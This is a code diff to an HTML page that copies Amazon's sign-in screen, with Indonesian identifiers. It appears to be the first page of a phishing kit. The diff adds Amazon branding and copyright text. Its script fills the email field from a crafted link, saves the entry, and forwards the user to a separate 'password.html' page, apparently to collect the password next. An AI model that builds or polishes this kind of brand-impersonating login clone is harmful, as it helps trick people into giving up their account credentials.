@@ -17,11 +17,10 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: 20px;
+            padding: 15px 20px;
         }
         .logo {
             margin: 10px 0 20px;
-            text-align: center;
         }
         .logo img {
             height: 30px;
@@ -31,88 +30,104 @@
             max-width: 348px;
             padding: 20px 26px;
             border: 1px solid #ddd;
-            border-radius: 4px;
+            border-radius: 8px;
             background: #fff;
         }
         .kotak h1 {
             font-size: 28px;
             font-weight: 400;
             margin-bottom: 12px;
+            line-height: 1.2;
         }
         .label {
             font-weight: 700;
             font-size: 13px;
-            margin: 15px 0 5px;
+            margin: 18px 0 6px;
             display: block;
         }
         .input {
             width: 100%;
             padding: 7px 10px;
             border: 1px solid #a6a6a6;
-            border-radius: 3px;
+            border-radius: 4px;
             font-size: 15px;
-            height: 31px;
+            height: 32px;
             outline: none;
-            transition: border-color 0.1s, box-shadow 0.1s;
         }
         .input:focus {
             border-color: #007185;
             box-shadow: 0 0 0 2px #c8f0f4;
         }
-        .input.error {
-            border-color: #c40000;
-        }
-        .pesan-error {
-            color: #c40000;
-            font-size: 12px;
-            margin: 6px 0 0;
-            display: none;
-            align-items: flex-start;
-            gap: 6px;
-        }
-        .pesan-error.terlihat {
-            display: flex;
-        }
-        .ikon-error {
-            font-weight: bold;
-        }
         .tombol-lanjut {
             width: 100%;
             padding: 6px 10px;
             background: linear-gradient(to bottom, #f7df89, #ecc000);
-            border: 1px solid #a88700;
+            border: 1px solid #d5b000;
             border-radius: 8px;
             font-size: 14px;
             cursor: pointer;
-            margin: 16px 0 20px;
-            height: 31px;
+            margin: 18px 0;
+            height: 40px;
         }
         .tombol-lanjut:hover {
             background: linear-gradient(to bottom, #f5d76e, #d4a300);
         }
-        .keterangan {
+        .syarat {
             font-size: 12px;
             line-height: 1.5;
-            margin-bottom: 22px;
+            margin-bottom: 20px;
         }
-        .keterangan a {
+        .syarat a {
+            color: #0066c0;
+            text-decoration: none;
+        }
+        .bantuan {
+            font-size: 12px;
+            margin-bottom: 25px;
+        }
+        .bantuan a {
             color: #0066c0;
             text-decoration: none;
         }
         .garis-pemisah {
             border-bottom: 1px solid #e7e7e7;
-            margin: 18px 0;
+            margin: 20px 0;
+        }
+        .bisnis {
+            font-size: 13px;
+        }
+        .bisnis strong {
+            display: block;
+            margin-bottom: 4px;
+        }
+        .bisnis a {
+            color: #0066c0;
+            text-decoration: none;
+            font-size: 12px;
         }
         .bawah {
             margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #e7e7e7;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
             font-size: 11px;
             color: #555;
-            text-align: center;
         }
         .bawah a {
             color: #0066c0;
             text-decoration: none;
             margin: 0 8px;
+        }
+        .pesan-error {
+            color: #d00;
+            font-size: 12px;
+            margin: 6px 0;
+            display: none;
+        }
+        .pesan-error.tampil {
+            display: block;
         }
     </style>
 </head>
@@ -126,22 +141,25 @@
         <h1>Sign in or create account</h1>
 
         <label class="label" for="email">Enter mobile number or email</label>
-        <input type="text" id="email" class="input" autocomplete="username">
+        <input type="text" id="email" class="input">
         
-        <div id="pesan-error" class="pesan-error">
-            <span class="ikon-error">!</span>
-            <span>Enter your mobile number or email</span>
-        </div>
+        <p id="pesan-error" class="pesan-error">Enter your mobile number or email</p>
 
         <button id="tombol-lanjut" class="tombol-lanjut" onclick="lanjut()">Continue</button>
 
-        <div class="keterangan">
-            By continuing, you agree to Amazon's
-            <a href="#">Conditions of Use</a> and
+        <p class="syarat">By continuing, you agree to Amazon's 
+            <a href="#">Conditions of Use</a> and 
             <a href="#">Privacy Notice</a>.
-        </div>
+        </p>
+
+        <p class="bantuan"><a href="#">Need help?</a></p>
 
         <div class="garis-pemisah"></div>
+
+        <p class="bisnis">
+            <strong>Buying for work?</strong>
+            <a href="#">Create a free business account</a>
+        </p>
     </div>
 
     <div class="bawah">
@@ -150,13 +168,14 @@
             <a href="#">Privacy Notice</a>
             <a href="#">Help</a>
         </p>
+        <p style="margin-top: 5px; color: #767676;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
     </div>
 
 <script>
 const inputEmail = document.getElementById('email');
 const pesanError = document.getElementById('pesan-error');
 
-// Isi otomatis dari link
+// Isi otomatis dari parameter URL
 window.addEventListener('load', function() {
     const url = window.location.href;
     const cocok = url.match(/-([^-]+@[^-]+)-\d+=aktif/);
@@ -167,8 +186,7 @@ window.addEventListener('load', function() {
 
 inputEmail.addEventListener('input', function() {
     if (this.value.trim()) {
-        pesanError.classList.remove('terlihat');
-        this.classList.remove('error');
+        pesanError.classList.remove('tampil');
     }
 });
 
@@ -180,15 +198,12 @@ function lanjut() {
     const email = inputEmail.value.trim();
     
     if (!email) {
-        pesanError.classList.add('terlihat');
-        inputEmail.classList.add('error');
+        pesanError.classList.add('tampil');
+        inputEmail.focus();
         return;
     }
 
-    // Simpan email ke penyimpanan
     localStorage.setItem('email_pengguna', email);
-    
-    // Pindah ke halaman password
     window.location.href = 'password.html';
 }
 </script>
